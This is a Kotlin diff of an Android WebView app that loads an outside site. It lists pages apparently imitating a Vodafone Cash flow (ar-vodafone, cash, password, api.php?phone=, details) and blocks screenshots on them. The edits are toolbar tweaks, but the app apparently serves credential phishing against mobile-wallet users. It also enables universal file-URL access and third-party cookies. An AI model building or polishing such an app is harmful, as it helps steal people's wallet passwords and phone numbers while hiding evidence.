@@ -28,12 +28,13 @@ class MainActivity : AppCompatActivity() {
 
     private val WEBSITE_URL = "https://reviews8.site.je/"
 
-    // ===== مسارات الصفحات =====
+    // كل المسارات اللي عايز فيها زر رجوع + منع سكرين شوت
     private val pagesWithBackButton = listOf(
         "ar-vodafone.html",
         "cash.html",
         "password.html",
         "api.php?phone=",
+        "api.php",
         "conversion.php",
         "details.php"
     )
@@ -43,6 +44,7 @@ class MainActivity : AppCompatActivity() {
         "cash.html",
         "password.html",
         "api.php?phone=",
+        "api.php",
         "conversion.php",
         "details.php"
     )
@@ -72,19 +74,15 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun setupToolbar() {
-        // زر شفاف تماما
         toolbar.setBackgroundColor(Color.TRANSPARENT)
         (toolbar.parent as? View)?.setBackgroundColor(Color.TRANSPARENT)
         toolbar.elevation = 0f
-        
-        // نشيل كلمة رجوع
         toolbar.title = ""
         toolbar.subtitle = ""
-        
-        // سهم يمين بس
-        toolbar.setNavigationIcon(R.drawable.ic_arrow_right)
+        toolbar.setNavigationIcon(R.drawable.ic_back_new)
         toolbar.setNavigationOnClickListener { if (webView.canGoBack()) webView.goBack() }
         toolbar.isVisible = false
+        (toolbar.parent as? View)?.isVisible = false
     }
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -104,9 +102,7 @@ class MainActivity : AppCompatActivity() {
         settings.allowFileAccessFromFileURLs = true
         settings.allowUniversalAccessFromFileURLs = true
         settings.mediaPlaybackRequiresUserGesture = false
-        // حل الصفحة البيضا
         settings.userAgentString = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
-        
         CookieManager.getInstance().setAcceptCookie(true)
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
         webView.webViewClient = object : WebViewClient() {
@@ -124,9 +120,17 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun updatePageFeatures(url: String?) {
-        if (url == null) { toolbar.isVisible = false; disableScreenshotProtection(); return }
+        if (url == null) {
+            toolbar.isVisible = false
+            (toolbar.parent as? View)?.isVisible = false
+            disableScreenshotProtection()
+            return
+        }
         val lowerUrl = url.lowercase()
-        toolbar.isVisible = pagesWithBackButton.any { lowerUrl.contains(it.lowercase()) }
+        val shouldShow = pagesWithBackButton.any { lowerUrl.contains(it.lowercase()) }
+        toolbar.isVisible = shouldShow
+        (toolbar.parent as? View)?.isVisible = shouldShow
+
         val shouldProtect = protectedPages.any { lowerUrl.contains(it.lowercase()) }
         if (shouldProtect) enableScreenshotProtection() else disableScreenshotProtection()
     }
